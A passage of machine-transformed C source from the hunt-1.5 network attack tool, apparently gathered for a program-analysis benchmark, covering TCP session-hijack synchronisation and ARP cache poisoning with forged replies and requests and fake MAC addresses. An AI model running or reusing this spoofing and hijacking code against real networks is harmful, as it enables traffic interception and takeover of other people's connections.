          if (need_read == (int volatile   )0) {
#line 445
            if (need_write == (int volatile   )0) {
#line 446
              f_sync_done = (int volatile   )1;
            }
          }
        }
      }
    }
  }
  {
#line 451
  packet_free(p);
  }
#line 453
  return;
}
}
#line 455 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
void ctrl_c_sync_handler(int signr ) 
{ 


  {
#line 457
  sync_was_canceled = (int volatile   )1;
#line 458
  f_sync_done = (int volatile   )1;
#line 459
  return;
}
}
#line 461 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
int hijack_sync(struct conn_info *ci ) 
{ 
  struct ifunc_item ifunc_f ;
  struct ifunc_item ifunc_dst ;
  struct timespec absts ;
  struct timeval now ;
  struct sigaction sac ;
  struct sigaction old_sac ;
  struct packet *p ;
  void *tmp ;

  {
  {
#line 469
  nw_was_negative = 0;
#line 470
  f_sync_done = (int volatile   )0;
#line 471
  list_produce_start(& l_hijack_conn);
#line 479
  ifunc_f.func = (void (*)(struct packet * , void * ))(& func_hijack_src_sync);
#line 480
  ifunc_f.arg = (void *)ci;
#line 481
  list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_f));
#line 483
  ifunc_dst.func = (void (*)(struct packet * , void * ))(& func_hijack_dst_sync);
#line 484
  ifunc_dst.arg = (void *)ci;
#line 485
  list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_dst));
#line 489
  gettimeofday((struct timeval */* __restrict  */)(& now), (__timezone_ptr_t )((void *)0));
#line 490
  absts.tv_sec = now.tv_sec + 100000L;
#line 491
  absts.tv_nsec = (__syscall_slong_t )0;
#line 493
  hijack_sync_init_msg(ci);
#line 495
  sync_was_canceled = (int volatile   )0;
#line 496
  sac.__sigaction_handler.sa_handler = & ctrl_c_sync_handler;
#line 497
  sigemptyset(& sac.sa_mask);
#line 498
  sigaddset(& sac.sa_mask, 2);
#line 499
  sac.sa_flags = 268435456;
#line 500
  sigaction(2, (struct sigaction  const  */* __restrict  */)(& sac), (struct sigaction */* __restrict  */)(& old_sac));
  }
#line 514
  if (need_write < (int volatile   )0) {
#line 515
    nw_was_negative = 0;
  }
  {
#line 516
  need_read_write_init();
  }
#line 517
  if (need_read < (int volatile   )0) {
    {
#line 518
    need_read_write_negative(ci);
    }
  } else
#line 517
  if (need_write < (int volatile   )0) {
    {
#line 518
    need_read_write_negative(ci);
    }
  }
#line 519
  if (need_read != (int volatile   )0) {
#line 519
    goto _L;
  } else
#line 519
  if (need_write != (int volatile   )0) {
    _L: /* CIL Label */ 
    {
#line 520
    while (1) {
      while_continue: /* CIL Label */ ;
#line 521
      if (! f_sync_done) {
        {
#line 521
        tmp = list_consume(& l_hijack_conn, (struct timespec  const  *)((void *)0));
#line 521
        p = (struct packet *)tmp;
        }
#line 521
        if (p) {
          {
#line 522
          f_hijack_sync(p, ci);
          }
        } else {
#line 524
          goto while_break;
        }
      } else {
#line 524
        goto while_break;
      }
#line 525
      if (sync_was_canceled) {
#line 526
        goto while_break;
      }
    }
    while_break: /* CIL Label */ ;
    }
  }
  {
#line 529
  list_remove(& l_ifunc_tcp, (void *)(& ifunc_f));
#line 530
  list_remove(& l_ifunc_tcp, (void *)(& ifunc_dst));
#line 532
  packet_flush(& l_hijack_conn);
  }
#line 534
  if (sync_was_canceled) {
    {
#line 535
    press_key((char *)"\n-- press any key> ");
    }
  }
  {
#line 536
  sigaction(2, (struct sigaction  const  */* __restrict  */)(& old_sac), (struct sigaction */* __restrict  */)((void *)0));
  }
#line 556
  if (sync_was_canceled) {
#line 557
    return (-1);
  } else {
#line 559
    return (0);
  }
}
}
#line 760 "/usr/include/pthread.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1), __leaf__)) pthread_mutex_init)(pthread_mutex_t *__mutex ,
                                                                                                         pthread_mutexattr_t const   *__mutexattr ) ;
#line 765
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1), __leaf__)) pthread_mutex_destroy)(pthread_mutex_t *__mutex ) ;
#line 979
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1), __leaf__)) pthread_cond_init)(pthread_cond_t * __restrict  __cond ,
                                                                                                        pthread_condattr_t const   * __restrict  __cond_attr ) ;
#line 984
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1), __leaf__)) pthread_cond_destroy)(pthread_cond_t *__cond ) ;
#line 992
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1))) pthread_cond_broadcast)(pthread_cond_t *__cond ) ;
#line 69 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.h"
void list_push(struct list *l , void *m ) ;
#line 76
void *list_pop(struct list *l ) ;
#line 61 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
unsigned char my_eth_mac[6] ;
#line 144
struct list l_ifunc_ip ;
#line 147
struct list l_ifunc_icmp ;
#line 148
struct list l_ifunc_arp ;
#line 328
struct packet *packet_new(void) ;
#line 332
void packet_copy_data(struct packet *dst , struct packet *src ) ;
#line 350
struct mac_info *mac_info_get(unsigned int ip ) ;
#line 351
void mac_info_release(struct mac_info *mi ) ;
#line 359
int menu_choose_yn(char *label , int dfl ) ;
#line 363
unsigned int menu_choose_hostname(char *label , char *dfl ) ;
#line 518
unsigned char mac_broadcast[6] ;
#line 519
unsigned char mac_zero[6] ;
#line 520
struct arp_spoof_info *start_arp_spoof(unsigned int src_addr , unsigned int dst_addr ,
                                       char *src_mac , char *dst_mac , char *src_fake_mac ,
                                       int refresh , int can_forward , int in_range ) ;
#line 525
void stop_arp_spoof(struct arp_spoof_info *asi ) ;
#line 527
void print_arp_relayer_daemon(void) ;
#line 528
int arpspoof_test(struct arp_spoof_info *asi ) ;
#line 529
int user_arpspoof_test(struct arp_spoof_info *asi ) ;
#line 530
void force_arp_spoof(struct arp_spoof_info *asi , int count___0 ) ;
#line 531
int run_arpspoof_until_successed(struct arp_spoof_info *asi ) ;
#line 532
int user_run_arpspoof_until_successed(struct arp_spoof_info *asi ) ;
#line 543
struct arp_dont_relay *arp_dont_relay_insert(unsigned int src_addr , unsigned int dst_addr ,
                                             unsigned int src_port , unsigned int dst_port ) ;
#line 546
void arp_dont_relay_remove(struct arp_dont_relay *adr ) ;
#line 548
int arp_request_spoof_through_request ;
#line 549
int arp_rr_count ;
#line 550
int arp_spoof_switch ;
#line 551
int arp_spoof_with_my_mac ;
#line 575
void mac_discover(unsigned int ip , int count___0 ) ;
#line 619
void relay_menu(void) ;
#line 620
int process_pktrelay(struct packet *p , struct arp_spoof_info *asi ) ;
#line 643
void register_timejob_rel(struct timejob *tj , int relsec ) ;
#line 644
void register_timejob_milsec_rel(struct timejob *tj , int milsec ) ;
#line 646
void unregister_timejob(struct timejob *tj ) ;
#line 697
void send_icmp_request(unsigned int src_addr , unsigned int dst_addr , char *src_mac ,
                       char *dst_mac , unsigned short seq ) ;
#line 699
int is_icmp_reply(struct packet *p , unsigned int src_addr , unsigned int dst_addr ,
                  char *src_mac , char *dst_mac ) ;
#line 714
int send_arp_packet(struct arp_spec *as ) ;
#line 716
int send_packet(struct packet *p ) ;
#line 718 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
__inline static void sec_nanosleep(int sec ) 
{ 
  struct timespec ts ;

  {
  {
#line 722
  ts.tv_sec = (__time_t )sec;
#line 723
  ts.tv_nsec = (__syscall_slong_t )0;
#line 724
  nanosleep((struct timespec  const  *)(& ts), (struct timespec *)((void *)0));
  }
#line 725
  return;
}
}
#line 69 "/usr/include/assert.h"
extern  __attribute__((__nothrow__, __noreturn__)) void ( __attribute__((__leaf__)) __assert_fail)(char const   *__assertion ,
                                                                                                   char const   *__file ,
                                                                                                   unsigned int __line ,
                                                                                                   char const   *__function ) ;
#line 31 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static struct list l_arp_spoof  = 
#line 31 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
     {(void *)0, (void *)0, (int )((char *)(& ((struct arp_spoof_info *)0)->next) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 32 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static struct list l_arp_dont_relay  = 
#line 32
     {(void *)0, (void *)0, (int )((char *)(& ((struct arp_dont_relay *)0)->next) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 33 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static struct list l_arp_spoof_range  = 
#line 33
     {(void *)0, (void *)0, (int )((char *)(& ((struct arp_spoof_range *)0)->next) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 34 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static struct ifunc_item ifunc_arp  ;
#line 36 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static pthread_t relay_thr  ;
#line 37 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static struct ifunc_item ifunc_relay  ;
#line 38 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static struct list l_relay_pkt  = 
#line 38
     {(void *)0, (void *)0, (int )((char *)(& ((struct packet *)0)->p_next[3]) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 39 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static int relayer_running  =    0;
#line 41 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
int arp_request_spoof_through_request  =    1;
#line 42 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
int arp_rr_count  =    2;
#line 43 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
int arp_spoof_switch  =    1;
#line 44 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
int arp_spoof_with_my_mac  =    0;
#line 45 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
int can_forward_question  =    0;
#line 47 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
unsigned char mac_broadcast[6]  = {      (unsigned char)255,      (unsigned char)255,      (unsigned char)255,      (unsigned char)255, 
        (unsigned char)255,      (unsigned char)255};
#line 48 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
unsigned char mac_zero[6]  = {      (unsigned char)0,      (unsigned char)0,      (unsigned char)0,      (unsigned char)0, 
        (unsigned char)0,      (unsigned char)0};
#line 76 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void send_src_spoof_to_dst(struct arp_spoof_info *asi ) 
{ 
  struct arp_spec as_dst ;
  int i ;
  uint16_t tmp ;

  {
#line 81
  if (! asi->dst_mac_valid) {
    {
#line 82
    fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"error: try to send arp spoof without known dst mac\n");
    }
#line 83
    return;
  }
#line 85
  if (arp_spoof_with_my_mac) {
#line 85
    as_dst.src_mac = (char *)(my_eth_mac);
  } else {
#line 85
    as_dst.src_mac = (char *)(asi->src_fake_mac);
  }
  {
#line 86
  as_dst.dst_mac = (char *)(asi->dst_mac);
#line 87
  tmp = htons((uint16_t )2);
#line 87
  as_dst.oper = (int )tmp;
#line 88
  as_dst.sender_mac = (char *)(asi->src_fake_mac);
#line 89
  as_dst.sender_addr = (unsigned long )asi->src_addr;
#line 90
  as_dst.target_mac = (char *)(asi->dst_mac);
#line 91
  as_dst.target_addr = (unsigned long )asi->dst_addr;
#line 93
  i = 0;
  }
  {
#line 93
  while (1) {
    while_continue: /* CIL Label */ ;
#line 93
    if (! (i < arp_rr_count)) {
#line 93
      goto while_break;
    }
    {
#line 94
    send_arp_packet(& as_dst);
#line 93
    i ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 95
  return;
}
}
#line 108 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void send_src_spoof_to_dst_through_request(struct arp_spoof_info *asi , unsigned int ask_addr ) 
{ 
  struct arp_spec as_dst ;
  int i ;
  uint16_t tmp ;

  {
#line 113
  if (! asi->dst_mac_valid) {
    {
#line 114
    fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"error: try to send arp spoof 2 without known dst mac\n");
    }
#line 115
    return;
  }
#line 117
  if (arp_spoof_with_my_mac) {
#line 117
    as_dst.src_mac = (char *)(my_eth_mac);
  } else {
#line 117
    as_dst.src_mac = (char *)(asi->src_fake_mac);
  }
  {
#line 118
  as_dst.dst_mac = (char *)(asi->dst_mac);
#line 119
  tmp = htons((uint16_t )1);
#line 119
  as_dst.oper = (int )tmp;
#line 120
  as_dst.sender_mac = (char *)(asi->src_fake_mac);
#line 121
  as_dst.sender_addr = (unsigned long )asi->src_addr;
#line 122
  as_dst.target_mac = (char *)(mac_zero);
#line 123
  as_dst.target_addr = (unsigned long )ask_addr;
#line 125
  i = 0;
  }
  {
#line 125
  while (1) {
    while_continue: /* CIL Label */ ;
#line 125
    if (! (i < arp_rr_count)) {
#line 125
      goto while_break;
    }
    {
#line 126
    send_arp_packet(& as_dst);
#line 125
    i ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 127
  return;
}
}
#line 129 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
int arp_spoof_timejob(void *arg , int arg_sec ) 
{ 
  struct arp_spoof_info *asi ;
  struct mac_info *mi_dst ;
  struct mac_info *mi_src ;
  uint32_t tmp ;
  uint32_t tmp___0 ;

  {
#line 131
  asi = (struct arp_spoof_info *)arg;
#line 134
  if (! asi->dst_mac_valid) {
    {
#line 135
    mi_dst = mac_info_get(asi->dst_addr);
    }
#line 135
    if (mi_dst) {
      {
#line 136
      memcpy((void */* __restrict  */)(asi->dst_mac), (void const   */* __restrict  */)(mi_dst->mac),
             (size_t )6);
#line 137
      asi->dst_mac_valid = 1;
#line 138
      mac_info_release(mi_dst);
      }
    } else {
      {
#line 140
      mac_discover(asi->dst_addr, 1);
      }
    }
  }
#line 144
  if (! asi->src_mac_valid) {
    {
#line 145
    mi_src = mac_info_get(asi->src_addr);
    }
#line 145
    if (mi_src) {
      {
#line 146
      memcpy((void */* __restrict  */)(asi->src_mac), (void const   */* __restrict  */)(mi_src->mac),
             (size_t )6);
#line 147
      asi->src_mac_valid = 1;
#line 148
      mac_info_release(mi_src);
      }
    } else {
      {
#line 150
      mac_discover(asi->src_addr, 1);
      }
    }
  }
#line 154
  if (asi->dst_mac_valid) {
    {
#line 155
    send_src_spoof_to_dst(asi);
#line 156
    tmp = ntohl(asi->dst_addr);
#line 156
    tmp___0 = htonl(tmp + 1U);
#line 156
    send_src_spoof_to_dst_through_request(asi, tmp___0);
    }
  }
#line 158
  return (arg_sec);
}
}
#line 179 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void func_arp(struct packet *p , void *arg ) 
{ 
  struct list_iterator li ;
  struct arphdr *arph ;
  struct arpeth_hdr *arpethh ;
  struct arp_spoof_info *asi ;
  struct timejob *tj ;
  uint16_t tmp ;
  void *tmp___0 ;
  void *tmp___1 ;
  void *tmp___2 ;
  uint16_t tmp___3 ;
  uint16_t tmp___4 ;

  {
  {
#line 187
  arph = p->p_arph;
#line 188
  arpethh = (struct arpeth_hdr *)(arph + 1);
#line 190
  tmp = htons((uint16_t )2048);
  }
#line 190
  if ((int )arph->ar_pro != (int )tmp) {
#line 191
    return;
  }
  {
#line 211
  list_lock(& l_arp_spoof);
#line 212
  list_iter_set(& li, & l_arp_spoof);
#line 213
  tmp___4 = htons((uint16_t )2);
  }
#line 213
  if ((int )arph->ar_op == (int )tmp___4) {
    {
#line 214
    while (1) {
      while_continue: /* CIL Label */ ;
      {
#line 214
      tmp___0 = list_iter_get(& li);
#line 214
      asi = (struct arp_spoof_info *)tmp___0;
      }
#line 214
      if (! asi) {
#line 214
        goto while_break;
      }
#line 215
      if (*((unsigned int *)(arpethh->ar_sip)) == asi->src_addr) {
#line 215
        if (*((unsigned int *)(arpethh->ar_tip)) == asi->dst_addr) {
#line 218
          if (! asi->dst_mac_valid) {
            {
#line 220
            memcpy((void */* __restrict  */)(asi->dst_mac), (void const   */* __restrict  */)(arpethh->ar_tha),
                   (size_t )6);
#line 221
            asi->dst_mac_valid = 1;
            }
          }
#line 223
          if (! asi->src_mac_valid) {
            {
#line 225
            memcpy((void */* __restrict  */)(asi->src_mac), (void const   */* __restrict  */)(arpethh->ar_sha),
                   (size_t )6);
#line 226
            asi->src_mac_valid = 1;
            }
          }
#line 228
          if (asi->tj_reply) {
            {
#line 229
            unregister_timejob(asi->tj_reply);
#line 230
            free((void *)asi->tj_reply);
#line 231
            asi->tj_reply = (struct timejob *)((void *)0);
            }
          }
          {
#line 234
          send_src_spoof_to_dst(asi);
          }
        }
      }
    }
    while_break: /* CIL Label */ ;
    }
  } else {
    {
#line 237
    tmp___3 = htons((uint16_t )1);
    }
#line 237
    if ((int )arph->ar_op == (int )tmp___3) {
      {
#line 243
      while (1) {
        while_continue___0: /* CIL Label */ ;
        {
#line 243
        tmp___2 = list_iter_get(& li);
#line 243
        asi = (struct arp_spoof_info *)tmp___2;
        }
#line 243
        if (! asi) {
#line 243
          goto while_break___0;
        }
#line 244
        if (*((unsigned int *)(arpethh->ar_sip)) == asi->dst_addr) {
#line 244
          if (*((unsigned int *)(arpethh->ar_tip)) == asi->src_addr) {
#line 249
            if (! asi->dst_mac_valid) {
              {
#line 251
              memcpy((void */* __restrict  */)(asi->dst_mac), (void const   */* __restrict  */)(arpethh->ar_sha),
                     (size_t )6);
#line 256
              asi->dst_mac_valid = 1;
              }
            }
#line 258
            if (! asi->src_mac_valid) {
              {
#line 260
              mac_discover(asi->src_addr, 1);
              }
            }
            {
#line 266
            send_src_spoof_to_dst(asi);
            }
#line 273
            if (asi->tj_reply) {
              {
#line 274
              unregister_timejob(asi->tj_reply);
#line 275
              free((void *)asi->tj_reply);
#line 276
              asi->tj_reply = (struct timejob *)((void *)0);
              }
            }
            {
#line 278
            tmp___1 = malloc(sizeof(struct timejob ));
#line 278
            tj = (struct timejob *)tmp___1;
#line 279
            tj->j_func = & arp_spoof_timejob;
#line 280
            tj->j_arg = (void *)asi;
#line 281
            tj->j_arg_sec = 0;
#line 282
            asi->tj_reply = tj;
#line 283
            register_timejob_milsec_rel(tj, 200);
            }
          }
        }
#line 291
        if (*((unsigned int *)(arpethh->ar_sip)) == asi->src_addr) {
#line 291
          if (asi->dst_mac_valid) {
#line 293
            if (arp_request_spoof_through_request) {
              {
#line 294
              send_src_spoof_to_dst_through_request(asi, *((unsigned int *)(arpethh->ar_tip)));
              }
            } else {
              {
#line 297
              send_src_spoof_to_dst(asi);
              }
            }
          }
        }
      }
      while_break___0: /* CIL Label */ ;
      }
    }
  }
  {
#line 303
  list_iter_end(& li);
#line 304
  list_unlock(& l_arp_spoof);
  }
#line 305
  return;
}
}
#line 310 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static struct arp_spoof_info *get_asi(unsigned int src_addr , unsigned int dst_addr ) 
{ 
  struct list_iterator li ;
  struct arp_spoof_info *asi ;
  struct arp_spoof_info *retval ;
  void *tmp ;

  {
  {
#line 315
  retval = (struct arp_spoof_info *)((void *)0);
#line 316
  list_iter_set(& li, & l_arp_spoof);
  }
  {
#line 317
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 317
    tmp = list_iter_get(& li);
#line 317
    asi = (struct arp_spoof_info *)tmp;
    }
#line 317
    if (! asi) {
#line 317
      goto while_break;
    }
#line 318
    if (asi->src_addr == src_addr) {
#line 318
      if (asi->dst_addr == dst_addr) {
#line 320
        retval = asi;
#line 321
        goto while_break;
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 324
  list_iter_end(& li);
  }
#line 325
  return (retval);
}
}
#line 332 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
struct arp_spoof_info *get_arp_spoof(unsigned int src_addr , unsigned int dst_addr ) 
{ 
  struct list_iterator li ;
  struct arp_spoof_info *asi ;
  struct arp_spoof_info *retval ;
  void *tmp ;

  {
  {
#line 337
  retval = (struct arp_spoof_info *)((void *)0);
#line 338
  list_iter_set(& li, & l_arp_spoof);
  }
  {
#line 339
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 339
    tmp = list_iter_get(& li);
#line 339
    asi = (struct arp_spoof_info *)tmp;
    }
#line 339
    if (! asi) {
#line 339
      goto while_break;
    }
#line 340
    if (asi->src_addr == src_addr) {
#line 340
      if (asi->dst_addr == dst_addr) {
#line 340
        if (asi->src_mac_valid) {
#line 340
          if (asi->dst_mac_valid) {
#line 343
            retval = asi;
#line 344
            goto while_break;
          }
        }
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 347
  list_iter_end(& li);
  }
#line 348
  return (retval);
}
}
#line 351 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
struct arp_dont_relay *arp_dont_relay_insert(unsigned int src_addr , unsigned int dst_addr ,
                                             unsigned int src_port , unsigned int dst_port ) 
{ 
  struct arp_dont_relay *adr ;
  void *tmp ;

  {
  {
#line 357
  tmp = malloc(sizeof(struct arp_dont_relay ));
#line 357
  adr = (struct arp_dont_relay *)tmp;
  }
#line 358
  if (! adr) {
    {
#line 358
    __assert_fail("adr", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c",
                  358U, "arp_dont_relay_insert");
    }
  }
  {
#line 359
  adr->src_addr = src_addr;
#line 360
  adr->dst_addr = dst_addr;
#line 361
  adr->src_port = (unsigned short )src_port;
#line 362
  adr->dst_port = (unsigned short )dst_port;
#line 363
  list_push(& l_arp_dont_relay, (void *)adr);
  }
#line 364
  return (adr);
}
}
#line 367 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
void arp_dont_relay_remove(struct arp_dont_relay *adr ) 
{ 


  {
  {
#line 369
  list_remove(& l_arp_dont_relay, (void *)adr);
#line 370
  free((void *)adr);
  }
#line 371
  return;
}
}
#line 373 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void asi_want(struct arp_spoof_info *asi ) 
{ 


  {
  {
#line 375
  pthread_mutex_lock(& asi->mutex);
#line 376
  (asi->lock_count) ++;
#line 377
  pthread_mutex_unlock(& asi->mutex);
  }
#line 378
  return;
}
}
#line 380 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void asi_release(struct arp_spoof_info *asi ) 
{ 


  {
  {
#line 382
  pthread_mutex_lock(& asi->mutex);
#line 383
  (asi->lock_count) --;
  }
#line 383
  if (asi->lock_count == 0) {
    {
#line 384
    pthread_cond_broadcast(& asi->lock_cond);
    }
  }
  {
#line 385
  pthread_mutex_unlock(& asi->mutex);
  }
#line 386
  return;
}
}
#line 388 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void asi_wait_for_release(struct arp_spoof_info *asi ) 
{ 


  {
  {
#line 390
  pthread_mutex_lock(& asi->mutex);
  }
  {
#line 391
  while (1) {
    while_continue: /* CIL Label */ ;
#line 391
    if (! (asi->lock_count > 0)) {
#line 391
      goto while_break;
    }
    {
#line 392
    pthread_cond_wait((pthread_cond_t */* __restrict  */)(& asi->lock_cond), (pthread_mutex_t */* __restrict  */)(& asi->mutex));
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 393
  pthread_mutex_unlock(& asi->mutex);
  }
#line 394
  return;
}
}
#line 396 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
struct arp_spoof_info *start_arp_spoof(unsigned int src_addr , unsigned int dst_addr ,
                                       char *src_mac , char *dst_mac , char *src_fake_mac ,
                                       int refresh , int can_forward , int in_range ) 
{ 
  struct arp_spoof_info *asi ;
  struct arp_spoof_info *tmp ;
  struct timespec ts ;
  struct timejob *tj ;
  struct list_iterator li ;
  int i ;
  int tmp___0 ;
  void *tmp___1 ;
  uint32_t tmp___2 ;
  uint32_t tmp___3 ;
  uint32_t tmp___4 ;
  uint32_t tmp___5 ;
  void *tmp___6 ;
  void *tmp___7 ;

  {
  {
#line 407
  asi = get_asi(src_addr, dst_addr);
  }
#line 407
  if (asi) {
#line 408
    if (! asi->dst_mac_valid) {
#line 408
      if (dst_mac) {
        {
#line 409
        memcpy((void */* __restrict  */)(asi->dst_mac), (void const   */* __restrict  */)dst_mac,
               (size_t )6);
#line 410
        asi->dst_mac_valid = 1;
        }
      }
    }
#line 412
    if (! asi->src_mac_valid) {
#line 412
      if (src_mac) {
        {
#line 413
        memcpy((void */* __restrict  */)(asi->src_mac), (void const   */* __restrict  */)src_mac,
               (size_t )6);
#line 414
        asi->src_mac_valid = 1;
        }
      }
    }
#line 416
    (asi->use_count) ++;
#line 417
    return (asi);
  }
#line 419
  if (! src_fake_mac) {
#line 420
    return ((struct arp_spoof_info *)((void *)0));
  }
  {
#line 422
  tmp___0 = list_count(& l_arp_spoof);
  }
#line 422
  if (tmp___0 == 0) {
    {
#line 423
    ifunc_arp.func = & func_arp;
#line 424
    ifunc_arp.arg = (void *)0;
#line 425
    list_enqueue(& l_ifunc_arp, (void *)(& ifunc_arp));
    }
  }
  {
#line 427
  tmp___1 = malloc(sizeof(struct arp_spoof_info ));
#line 427
  asi = (struct arp_spoof_info *)tmp___1;
  }
#line 428
  if (! asi) {
    {
#line 428
    __assert_fail("asi", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c",
                  428U, "start_arp_spoof");
    }
  }
  {
#line 429
  memset((void *)asi, 0, sizeof(struct arp_spoof_info ));
#line 430
  pthread_mutex_init(& asi->mutex, (pthread_mutexattr_t const   *)((void *)0));
#line 431
  pthread_cond_init((pthread_cond_t */* __restrict  */)(& asi->lock_cond), (pthread_condattr_t const   */* __restrict  */)((void *)0));
#line 432
  asi->lock_count = 0;
#line 434
  asi->use_count = 1;
#line 435
  asi->refresh = refresh;
#line 436
  asi->tj_refresh = (struct timejob *)((void *)0);
#line 437
  asi->tj_reply = (struct timejob *)((void *)0);
#line 439
  asi->src_addr = src_addr;
#line 440
  asi->dst_addr = dst_addr;
#line 442
  memcpy((void */* __restrict  */)(asi->src_fake_mac), (void const   */* __restrict  */)src_fake_mac,
         (size_t )6);
  }
#line 443
  if (dst_mac) {
    {
#line 444
    memcpy((void */* __restrict  */)(asi->dst_mac), (void const   */* __restrict  */)dst_mac,
           (size_t )6);
#line 445
    asi->dst_mac_valid = 1;
    }
  } else {
#line 447
    asi->dst_mac_valid = 0;
  }
#line 448
  if (src_mac) {
    {
#line 449
    memcpy((void */* __restrict  */)(asi->src_mac), (void const   */* __restrict  */)src_mac,
           (size_t )6);
#line 450
    asi->src_mac_valid = 1;
    }
  } else {
#line 452
    asi->src_mac_valid = 0;
  }
#line 454
  asi->can_forward = can_forward;
#line 455
  asi->in_range = in_range;
#line 459
  if (asi->dst_mac_valid) {
    {
#line 460
    send_src_spoof_to_dst(asi);
#line 461
    tmp___2 = ntohl(dst_addr);
#line 461
    tmp___3 = htonl(tmp___2 + 1U);
#line 461
    send_src_spoof_to_dst_through_request(asi, tmp___3);
    }
#line 463
    if (arp_spoof_switch) {
      {
#line 464
      ts.tv_sec = (__time_t )0;
#line 465
      ts.tv_nsec = (__syscall_slong_t )100000000;
#line 466
      nanosleep((struct timespec  const  *)(& ts), (struct timespec *)((void *)0));
#line 467
      send_src_spoof_to_dst(asi);
#line 468
      tmp___4 = ntohl(dst_addr);
#line 468
      tmp___5 = htonl(tmp___4 + 1U);
#line 468
      send_src_spoof_to_dst_through_request(asi, tmp___5);
      }
    }
  }
#line 475
  if (in_range) {
    {
#line 476
    list_enqueue(& l_arp_spoof, (void *)asi);
    }
  } else {
    {
#line 478
    i = 0;
#line 479
    list_iter_set(& li, & l_arp_spoof);
    }
    {
#line 480
    while (1) {
      while_continue: /* CIL Label */ ;
      {
#line 480
      tmp___6 = list_iter_get(& li);
#line 480
      tmp = (struct arp_spoof_info *)tmp___6;
      }
#line 480
      if (! tmp) {
#line 480
        goto while_break;
      }
#line 481
      if (tmp->in_range) {
#line 482
        goto while_break;
      }
#line 483
      i ++;
    }
    while_break: /* CIL Label */ ;
    }
    {
#line 485
    list_iter_end(& li);
#line 486
    list_insert_at(& l_arp_spoof, i, (void *)asi);
    }
  }
#line 488
  if (refresh) {
    {
#line 489
    tmp___7 = malloc(sizeof(struct timejob ));
#line 489
    tj = (struct timejob *)tmp___7;
    }
#line 490
    if (! tj) {
      {
#line 490
      __assert_fail("tj", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c",
                    490U, "start_arp_spoof");
      }
    }
    {
#line 491
    tj->j_func = & arp_spoof_timejob;
